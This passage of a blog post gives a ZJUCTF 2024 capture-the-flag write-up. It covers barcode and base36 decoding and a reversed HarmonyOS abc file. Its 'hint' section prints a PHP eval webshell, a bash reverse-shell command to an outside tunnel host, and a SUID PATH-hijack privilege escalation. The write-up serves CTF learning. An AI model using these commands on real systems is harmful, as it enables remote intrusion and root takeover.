2</span><br>    <span class="hljs-string">&#x27;221132&#x27;</span>: <span class="hljs-string">&#x27;3&#x27;</span>,      <span class="hljs-comment"># 3</span><br>    <span class="hljs-string">&#x27;221231&#x27;</span>: <span class="hljs-string">&#x27;4&#x27;</span>,      <span class="hljs-comment"># 4</span><br>    <span class="hljs-string">&#x27;213212&#x27;</span>: <span class="hljs-string">&#x27;5&#x27;</span>,      <span class="hljs-comment"># 5</span><br>    <span class="hljs-string">&#x27;223112&#x27;</span>: <span class="hljs-string">&#x27;6&#x27;</span>,      <span class="hljs-comment"># 6</span><br>    <span class="hljs-string">&#x27;312131&#x27;</span>: <span class="hljs-string">&#x27;7&#x27;</span>,      <span class="hljs-comment"># 7</span><br>    <span class="hljs-string">&#x27;311222&#x27;</span>: <span class="hljs-string">&#x27;8&#x27;</span>,      <span class="hljs-comment"># 8</span><br>    <span class="hljs-string">&#x27;321122&#x27;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,      <span class="hljs-comment"># 9</span><br>    <span class="hljs-string">&#x27;321221&#x27;</span>: <span class="hljs-string">&#x27;:&#x27;</span>,      <span class="hljs-comment"># :</span><br>    <span class="hljs-string">&#x27;312212&#x27;</span>: <span class="hljs-string">&#x27;;&#x27;</span>,      <span class="hljs-comment"># ;</span><br>    <span class="hljs-string">&#x27;322112&#x27;</span>: <span class="hljs-string">&#x27;&lt;&#x27;</span>,      <span class="hljs-comment"># &lt;</span><br>    <span class="hljs-string">&#x27;322211&#x27;</span>: <span class="hljs-string">&#x27;=&#x27;</span>,      <span class="hljs-comment"># =</span><br>    <span class="hljs-string">&#x27;212123&#x27;</span>: <span class="hljs-string">&#x27;&gt;&#x27;</span>,      <span class="hljs-comment"># &gt;</span><br>    <span class="hljs-string">&#x27;212321&#x27;</span>: <span class="hljs-string">&#x27;?&#x27;</span>,      <span class="hljs-comment"># ?</span><br>    <span class="hljs-string">&#x27;232121&#x27;</span>: <span class="hljs-string">&#x27;@&#x27;</span>,      <span class="hljs-comment"># @</span><br>    <span class="hljs-string">&#x27;111323&#x27;</span>: <span class="hljs-string">&#x27;A&#x27;</span>,      <span class="hljs-comment"># A</span><br>    <span class="hljs-string">&#x27;131123&#x27;</span>: <span class="hljs-string">&#x27;B&#x27;</span>,      <span class="hljs-comment"># B</span><br>    <span class="hljs-string">&#x27;131321&#x27;</span>: <span class="hljs-string">&#x27;C&#x27;</span>,      <span class="hljs-comment"># C</span><br>    <span class="hljs-string">&#x27;112313&#x27;</span>: <span class="hljs-string">&#x27;D&#x27;</span>,      <span class="hljs-comment"># D</span><br>    <span class="hljs-string">&#x27;132113&#x27;</span>: <span class="hljs-string">&#x27;E&#x27;</span>,      <span class="hljs-comment"># E</span><br>    <span class="hljs-string">&#x27;132311&#x27;</span>: <span class="hljs-string">&#x27;F&#x27;</span>,      <span class="hljs-comment"># F</span><br>    <span class="hljs-string">&#x27;211313&#x27;</span>: <span class="hljs-string">&#x27;G&#x27;</span>,      <span class="hljs-comment"># G</span><br>    <span class="hljs-string">&#x27;231113&#x27;</span>: <span class="hljs-string">&#x27;H&#x27;</span>,      <span class="hljs-comment"># H</span><br>    <span class="hljs-string">&#x27;231311&#x27;</span>: <span class="hljs-string">&#x27;I&#x27;</span>,      <span class="hljs-comment"># I</span><br>    <span class="hljs-string">&#x27;112133&#x27;</span>: <span class="hljs-string">&#x27;J&#x27;</span>,      <span class="hljs-comment"># J</span><br>    <span class="hljs-string">&#x27;112331&#x27;</span>: <span class="hljs-string">&#x27;K&#x27;</span>,      <span class="hljs-comment"># K</span><br>    <span class="hljs-string">&#x27;132131&#x27;</span>: <span class="hljs-string">&#x27;L&#x27;</span>,      <span class="hljs-comment"># L</span><br>    <span class="hljs-string">&#x27;113123&#x27;</span>: <span class="hljs-string">&#x27;M&#x27;</span>,      <span class="hljs-comment"># M</span><br>    <span class="hljs-string">&#x27;113321&#x27;</span>: <span class="hljs-string">&#x27;N&#x27;</span>,      <span class="hljs-comment"># N</span><br>    <span class="hljs-string">&#x27;133121&#x27;</span>: <span class="hljs-string">&#x27;O&#x27;</span>,      <span class="hljs-comment"># O</span><br>    <span class="hljs-string">&#x27;313121&#x27;</span>: <span class="hljs-string">&#x27;P&#x27;</span>,      <span class="hljs-comment"># P</span><br>    <span class="hljs-string">&#x27;211331&#x27;</span>: <span class="hljs-string">&#x27;Q&#x27;</span>,      <span class="hljs-comment"># Q</span><br>    <span class="hljs-string">&#x27;231131&#x27;</span>: <span class="hljs-string">&#x27;R&#x27;</span>,      <span class="hljs-comment"># R</span><br>    <span class="hljs-string">&#x27;213113&#x27;</span>: <span class="hljs-string">&#x27;S&#x27;</span>,      <span class="hljs-comment"># S</span><br>    <span class="hljs-string">&#x27;213311&#x27;</span>: <span class="hljs-string">&#x27;T&#x27;</span>,      <span class="hljs-comment"># T</span><br>    <span class="hljs-string">&#x27;213131&#x27;</span>: <span class="hljs-string">&#x27;U&#x27;</span>,      <span class="hljs-comment"># U</span><br>    <span class="hljs-string">&#x27;311123&#x27;</span>: <span class="hljs-string">&#x27;V&#x27;</span>,      <span class="hljs-comment"># V</span><br>    <span class="hljs-string">&#x27;311321&#x27;</span>: <span class="hljs-string">&#x27;W&#x27;</span>,      <span class="hljs-comment"># W</span><br>    <span class="hljs-string">&#x27;331121&#x27;</span>: <span class="hljs-string">&#x27;X&#x27;</span>,      <span class="hljs-comment"># X</span><br>    <span class="hljs-string">&#x27;312113&#x27;</span>: <span class="hljs-string">&#x27;Y&#x27;</span>,      <span class="hljs-comment"># Y</span><br>    <span class="hljs-string">&#x27;312311&#x27;</span>: <span class="hljs-string">&#x27;Z&#x27;</span>,      <span class="hljs-comment"># Z</span><br>    <span class="hljs-string">&#x27;332111&#x27;</span>: <span class="hljs-string">&#x27;[&#x27;</span>,      <span class="hljs-comment"># [</span><br>    <span class="hljs-string">&#x27;314111&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,     <span class="hljs-comment"># \</span><br>    <span class="hljs-string">&#x27;221411&#x27;</span>: <span class="hljs-string">&#x27;]&#x27;</span>,      <span class="hljs-comment"># ]</span><br>    <span class="hljs-string">&#x27;431111&#x27;</span>: <span class="hljs-string">&#x27;^&#x27;</span>,      <span class="hljs-comment"># ^</span><br>    <span class="hljs-string">&#x27;111224&#x27;</span>: <span class="hljs-string">&#x27;_&#x27;</span>,      <span class="hljs-comment"># _</span><br>    <span class="hljs-string">&#x27;111422&#x27;</span>: <span class="hljs-string">&#x27;`&#x27;</span>,      <span class="hljs-comment"># `</span><br>    <span class="hljs-string">&#x27;121124&#x27;</span>: <span class="hljs-string">&#x27;a&#x27;</span>,      <span class="hljs-comment"># a</span><br>    <span class="hljs-string">&#x27;121421&#x27;</span>: <span class="hljs-string">&#x27;b&#x27;</span>,      <span class="hljs-comment"># b</span><br>    <span class="hljs-string">&#x27;141122&#x27;</span>: <span class="hljs-string">&#x27;c&#x27;</span>,      <span class="hljs-comment"># c</span><br>    <span class="hljs-string">&#x27;141221&#x27;</span>: <span class="hljs-string">&#x27;d&#x27;</span>,      <span class="hljs-comment"># d</span><br>    <span class="hljs-string">&#x27;112214&#x27;</span>: <span class="hljs-string">&#x27;e&#x27;</span>,      <span class="hljs-comment"># e</span><br>    <span class="hljs-string">&#x27;112412&#x27;</span>: <span class="hljs-string">&#x27;f&#x27;</span>,      <span class="hljs-comment"># f</span><br>    <span class="hljs-string">&#x27;122114&#x27;</span>: <span class="hljs-string">&#x27;g&#x27;</span>,      <span class="hljs-comment"># g</span><br>    <span class="hljs-string">&#x27;122411&#x27;</span>: <span class="hljs-string">&#x27;h&#x27;</span>,      <span class="hljs-comment"># h</span><br>    <span class="hljs-string">&#x27;142112&#x27;</span>: <span class="hljs-string">&#x27;i&#x27;</span>,      <span class="hljs-comment"># i</span><br>    <span class="hljs-string">&#x27;142211&#x27;</span>: <span class="hljs-string">&#x27;j&#x27;</span>,      <span class="hljs-comment"># j</span><br>    <span class="hljs-string">&#x27;241211&#x27;</span>: <span class="hljs-string">&#x27;k&#x27;</span>,      <span class="hljs-comment"># k</span><br>    <span class="hljs-string">&#x27;221114&#x27;</span>: <span class="hljs-string">&#x27;l&#x27;</span>,      <span class="hljs-comment"># l</span><br>    <span class="hljs-string">&#x27;413111&#x27;</span>: <span class="hljs-string">&#x27;m&#x27;</span>,      <span class="hljs-comment"># m</span><br>    <span class="hljs-string">&#x27;241112&#x27;</span>: <span class="hljs-string">&#x27;n&#x27;</span>,      <span class="hljs-comment"># n</span><br>    <span class="hljs-string">&#x27;134111&#x27;</span>: <span class="hljs-string">&#x27;o&#x27;</span>,      <span class="hljs-comment"># o</span><br>    <span class="hljs-string">&#x27;111242&#x27;</span>: <span class="hljs-string">&#x27;p&#x27;</span>,      <span class="hljs-comment"># p</span><br>    <span class="hljs-string">&#x27;121142&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>,      <span class="hljs-comment"># q</span><br>    <span class="hljs-string">&#x27;121241&#x27;</span>: <span class="hljs-string">&#x27;r&#x27;</span>,      <span class="hljs-comment"># r</span><br>    <span class="hljs-string">&#x27;114212&#x27;</span>: <span class="hljs-string">&#x27;s&#x27;</span>,      <span class="hljs-comment"># s</span><br>    <span class="hljs-string">&#x27;124112&#x27;</span>: <span class="hljs-string">&#x27;t&#x27;</span>,      <span class="hljs-comment"># t</span><br>    <span class="hljs-string">&#x27;124211&#x27;</span>: <span class="hljs-string">&#x27;u&#x27;</span>,      <span class="hljs-comment"># u</span><br>    <span class="hljs-string">&#x27;411212&#x27;</span>: <span class="hljs-string">&#x27;v&#x27;</span>,      <span class="hljs-comment"># v</span><br>    <span class="hljs-string">&#x27;421112&#x27;</span>: <span class="hljs-string">&#x27;w&#x27;</span>,      <span class="hljs-comment"># w</span><br>    <span class="hljs-string">&#x27;421211&#x27;</span>: <span class="hljs-string">&#x27;x&#x27;</span>,      <span class="hljs-comment"># x</span><br>    <span class="hljs-string">&#x27;212141&#x27;</span>: <span class="hljs-string">&#x27;y&#x27;</span>,      <span class="hljs-comment"># y</span><br>    <span class="hljs-string">&#x27;214121&#x27;</span>: <span class="hljs-string">&#x27;z&#x27;</span>,      <span class="hljs-comment"># z</span><br>    <span class="hljs-string">&#x27;412121&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#x27;</span>,      <span class="hljs-comment"># &#123;</span><br>    <span class="hljs-string">&#x27;111143&#x27;</span>: <span class="hljs-string">&#x27;|&#x27;</span>,      <span class="hljs-comment"># |</span><br>    <span class="hljs-string">&#x27;111341&#x27;</span>: <span class="hljs-string">&#x27;&#125;&#x27;</span>,      <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-string">&#x27;131141&#x27;</span>: <span class="hljs-string">&#x27;~&#x27;</span>,      <span class="hljs-comment"># ~</span><br>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis),<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(code128b_dict[lis[i:i+<span class="hljs-number">6</span>]],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/32.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>用条形码解出的信息解析base36，得到flag: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">indexes = <span class="hljs-string">&#x27;ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789&#x27;</span><br>res = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp:<br>    res = res*<span class="hljs-number">36</span>+indexes.index(i)<br><br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-built_in">print</span>(n2s(res))<br><br><span class="hljs-comment"># ZJUCTF&#123;A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD&#125;</span><br></code></pre></td></tr></table></figure></p></li>
</ul>
<h2 id="cba">CBA</h2>
<ul>
<li>根据出题人给的hint，<code>reverse the CBA and you will get an ABC.</code>猜测他给的附件是一个鸿蒙abc文件倒过来，写个脚本得到文件（开头确实是<code>PANDA</code>文件头）： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cba&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>new = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.abc&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.read()[::-<span class="hljs-number">1</span>]:<br>    tmp = <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    tmp = <span class="hljs-built_in">int</span>(tmp[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)<br>    new.write(<span class="hljs-built_in">bytes</span>([tmp]))<br></code></pre></td></tr></table></figure></li>
<li>用工具逆向abc文件，发现main定义了一堆字符串，每个字符串倒过来就是app的一些函数，根据变量名编号连起来，发现是一串绘图的代码： <img src="/img/zjuctf2024/41.png" srcset="/img/loading.gif" lazyload> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>lis = [<span class="hljs-number">0</span>]*<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    tmp = f.readline()<br>    tmp = tmp.replace(<span class="hljs-string">&quot;\\n&quot;</span>,<span class="hljs-string">&quot;\n&quot;</span>)<br>    indexs = <span class="hljs-built_in">int</span>(tmp[tmp.index(<span class="hljs-string">&quot;part&quot;</span>)+<span class="hljs-number">4</span>:tmp.index(<span class="hljs-string">&quot; =&quot;</span>)])<br>    lis[indexs] = tmp[tmp.index(<span class="hljs-string">&#x27;&quot;&#x27;</span>)+<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>]<br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis[::-<span class="hljs-number">1</span>]:<br>    res+=i<br>new = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>new.write(res)<br><span class="hljs-comment"># print(res)</span><br></code></pre></td></tr></table></figure> res.txt开头长这样： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Column() &#123;<br>Row() &#123; &#125;.width(<span class="hljs-string">&#x27;100%&#x27;</span>).height(<span class="hljs-string">&#x27;6%&#x27;</span>)<br>Row() &#123;<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#000000&#x27;</span>)<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#efefef&#x27;</span>)<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#f8f8f8&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
<li>根据这个绘制的颜色编写脚本，手动绘制得到flag： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br>img = []<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    line = line.strip()<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;Column() &#123; &#125;.width(&#x27;1%&#x27;).hei&quot;</span>):<br>        color = line.index(<span class="hljs-string">&#x27;#&#x27;</span>)<br>        color = line[color+<span class="hljs-number">1</span>:color+<span class="hljs-number">7</span>]<br>        <span class="hljs-keyword">if</span> color == <span class="hljs-string">&#x27;000000&#x27;</span>:<br>            img.append(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(img)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(img[i])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(img[i], end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;you_are_good_at_reverse_engineering&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/42.png" srcset="/img/loading.gif" lazyload> 只弄了黑白双色所以很丑，原图应该挺炫酷的qaq</li>
</ul>
<h2 id="hint">hint</h2>
<ul>
<li>通过upload获得入口点，是一个webshell，<code>&lt;?php @eval($_POST['ZJUCTF&#123;Ye5_We1l_inj3C.t10N!!&#125;']);</code>，尝试用蚁🗡连接，发现并不行;</li>
<li>后来搭建本地环境，尝试用post方法传参，发现它把<code>.</code>解析成<code>_</code>了： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ZJUCTF&#123;Ye5_We1l_inj3C.t10N!!&#125;&#x27;</span>];<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure></li>
<li>去网上搜发现一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115050295">博客</a>，把前面两个下划线改一个中括号就可以了,接下来就是一个正常的反弹shell，用<code>system("bash -c 'bash -i &gt;&amp;/dev/tcp/23.tcp.cpolar.top/10161 0&gt;&amp;1'");</code>: <img src="/img/zjuctf2024/51.png" srcset="/img/loading.gif" lazyload> <img src="/img/zjuctf2024/52.png" srcset="/img/loading.gif" lazyload></li>
<li>我们需要读取到<code>/root</code>文件夹下的flag，说明是一道提权的题目，查看<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现一个有端倪的程序<code>/opt/hint</code>，用蚁🗡下载文件，反编译入下: <img src="/img/zjuctf2024/54.png" srcset="/img/loading.gif" lazyload> <img src="/img/zjuctf2024/53.png" srcset="/img/loading.gif" lazyload></li>
<li>发现程序一开始重设了环境变量，就不能通过动态链接库劫持程序来提权了，但是发现程序执行了<code>system("You are kidding")</code>，根据<a target="_blank" rel="noopener" href="https://blog.csdn.net/nicai321/article/details/122275160">博客</a>通过如下操作可以提权，拿到flag: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;/bin/bash&quot; &gt; /tmp/You<br>chmod 777 /tmp/You<br>export PATH=/tmp:$PATH<br>cd /opt<br>./hint<br></code></pre></td></tr></table></figure> 输入非0和非1的数字即可(ZJUCTF{Don't_u_liKe_Th3_h1n7???}): <img src="/img/zjuctf2024/55.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h1 id="总结"><strong>总结</strong></h1>
<p>一个星期打下来人都神志不清了🫠🫠🫠 <img src="/img/zjuctf2024/result.png" srcset="/img/loading.gif" lazyload></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF-writeup/" class="category-chain-item">CTF writeup</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              

              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/01/21/todoList/" title="todoList">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">todoList</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/03/18/%E5%A6%82%E6%9E%9C%E7%94%9F%E5%91%BD%E6%B2%A1%E6%9C%89%E7%BB%88%E7%82%B9/" title="如果生命没有终点">
                        <span class="hidden-mobile">如果生命没有终点</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="twikoo"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
        var options = Object.assign(
          {"envId":"https://wuyan1345.netlify.app/.netlify/functions/twikoo","region":"ap-shanghai","path":"window.location.pathname"},
          {
            el: '#twikoo',
            path: 'window.location.pathname',
            onCommentLoaded: function() {
              Fluid.utils.listenDOMLoaded(function() {
                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
                Fluid.plugins.imageCaption(imgSelector);
                Fluid.plugins.fancyBox(imgSelector);
              });
            }
          }
        )
        twikoo.init(options)
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <i class="iconfont icon-copyright"></i> <a href="https://github.com/wuyan1345" target="_blank" rel="nofollow noopener"><span>2025 WuYan</span></a>
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
